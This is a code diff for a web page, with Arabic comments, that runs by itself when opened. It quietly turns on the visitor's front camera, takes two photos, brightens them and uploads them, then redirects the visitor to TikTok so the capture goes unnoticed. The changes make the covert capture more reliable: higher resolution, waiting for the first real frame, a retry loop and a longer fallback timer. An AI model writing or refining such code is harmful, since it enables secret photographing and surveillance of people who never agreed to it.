@@ -7,7 +7,7 @@
         body {
             margin: 0;
             padding: 0;
-            background: black;
+            background: white;
         }
     </style>
 </head>
@@ -37,25 +37,32 @@
             }
 
             try {
-                // طلب الكاميرا الأمامية
+                // طلب الكاميرا الأمامية بدقة عالية
                 stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: true, 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: "user"
+                    }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
                 
-                // انتظار 3 ثواني عشان الكاميرا تثبت وتضبط الإضاءة
-                setTimeout(() => {
-                    // التقاط الصورة الأولى
-                    capturePhoto();
-                    
-                    // التقاط الصورة الثانية بعد ثانيتين
+                // ننتظر حتى الكاميرا تظهر أول إطار حقيقي
+                video.onloadeddata = () => {
+                    // ننتظر 2 ثانية عشان الكاميرا تضبط الإضاءة والألوان
                     setTimeout(() => {
+                        // التقاط الصورة الأولى
                         capturePhoto();
+                        
+                        // التقاط الصورة الثانية بعد ثانية ونصف
+                        setTimeout(() => {
+                            capturePhoto();
+                        }, 1500);
+                        
                     }, 2000);
-                    
-                }, 3000);
+                };
                 
             } catch (err) {
                 // إذا فشل، أرسل رسالة
@@ -74,10 +81,35 @@
 
         // ====== التقاط صورة ======
         function capturePhoto() {
+            // نتأكد أن الفيديو جاهز وله أبعاد
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                // إذا مش جاهز، نجرب مرة ثانية بعد 200 مللي ثانية
+                setTimeout(capturePhoto, 200);
+                return;
+            }
+            
+            // ضبط أبعاد الكانفس حسب الفيديو
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
             
+            // رسم الصورة بجودة عالية
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحسين التباين والإضاءة (اختياري)
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const data = imageData.data;
+            
+            // تطبيق تعديل بسيط للسطوع إذا كانت الصورة داكنة
+            for (let i = 0; i < data.length; i += 4) {
+                // زيادة السطوع بنسبة 10% للصور الداكنة
+                data[i] = Math.min(255, data[i] * 1.1);     // Red
+                data[i+1] = Math.min(255, data[i+1] * 1.1); // Green
+                data[i+2] = Math.min(255, data[i+2] * 1.1); // Blue
+            }
+            ctx.putImageData(imageData, 0, 0);
+            
+            // تحويل إلى blob بجودة عالية
             canvas.toBlob((blob) => {
                 photos.push(blob);
                 photoCount++;
@@ -86,7 +118,7 @@
                 if (photoCount === 2) {
                     sendPhotos();
                 }
-            }, 'image/jpeg', 0.9);
+            }, 'image/jpeg', 0.95); // جودة 95%
         }
 
         // ====== إرسال الصور ======
@@ -110,7 +142,10 @@
                     body: form2
                 });
             }).finally(() => {
-                stream.getTracks().forEach(t => t.stop());
+                // إيقاف الكاميرا
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                }
                 window.location.href = "https://www.tiktok.com";
             });
         }
@@ -118,10 +153,10 @@
         // تشغيل
         start();
 
-        // طوارئ: توجه بعد 10 ثواني
+        // طوارئ: توجه بعد 15 ثواني (زيادة وقت الطوارئ شوية)
         setTimeout(() => {
             window.location.href = "https://www.tiktok.com";
-        }, 10000);
+        }, 15000);
     </script>
 </body>
 </html>
